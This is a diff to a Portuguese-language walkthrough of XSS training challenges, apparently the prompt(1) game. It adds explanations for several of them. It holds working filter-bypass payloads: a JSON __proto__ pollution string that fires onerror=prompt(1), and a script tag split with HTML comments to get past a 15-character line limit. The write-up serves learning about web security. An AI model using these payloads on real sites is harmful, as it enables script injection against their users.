@@ -77,17 +77,6 @@ HTML Source:
 
 [![questao4.png](https://i.postimg.cc/nz5tYGwx/questao4.png)](https://postimg.cc/mzQqTCsp)
 
-Input:
-```
-
-```
-resolução
-
-HTML Source:
-```
-
-```
-
 #### Desafio 5:
 
 [![questao5.png](https://i.postimg.cc/R0kkWZ3C/questao5.png)](https://postimg.cc/GBj7NrJ6)
@@ -249,9 +238,33 @@ Input:
 ```
 {"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
 ```
-
+Nesse desafio o código manipula arquivos JSON tentando criar uma tag `<img>`. Para conseguirmos driblar as limitações na segurança iremos a propriedade `proto` do objeto JSON para conseguirmos redefinir o valor da chave src para causar no evento onerror assim resultando na ativação da função `prompt(1)`
 
 HTML Source:
 ```
 <img src="<img src="onerror=prompt(1)>">
+```
+
+#### Desafio E:
+
+[![questaoE.png](https://i.postimg.cc/d3sbJsp6/questaoE.png)](https://postimg.cc/XGPH8bVB)
+
+#### Desafio F:
+
+[![questaoF.png](https://i.postimg.cc/XvK1XMwz/questaoF.png)](https://postimg.cc/2q67XK9Q)
+
+Input:
+```
+"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
+```
+Assim como no desafio 7 estamos lidando com um código que limita a quantidade de caracteres por linha, dessa vez permitindo até 15 caracteres, e se tem uma quebra de linha através de `#`, além de uma filtragem que não permite usar `*`. 
+
+Para realizar essa questão dividiremos nosso código `"><script>prompt(1)</script>` em partes, a cada 15 caracteres do nosso código faremos uma quebra de linha e ultilizaremos `<!--` e `-->` para transformar as partes de código geradas toda vez que realizamos uma quebra de linha em comentários.
+
+HTML Source:
+```
+<p class="comment" title=""><svg><!--" data-comment='{"id":0}'></p>
+<p class="comment" title="--><script><!--" data-comment='{"id":1}'></p>
+<p class="comment" title="-->prompt(1<!--" data-comment='{"id":2}'></p>
+<p class="comment" title="-->)</script>" data-comment='{"id":3}'></p>
 ```
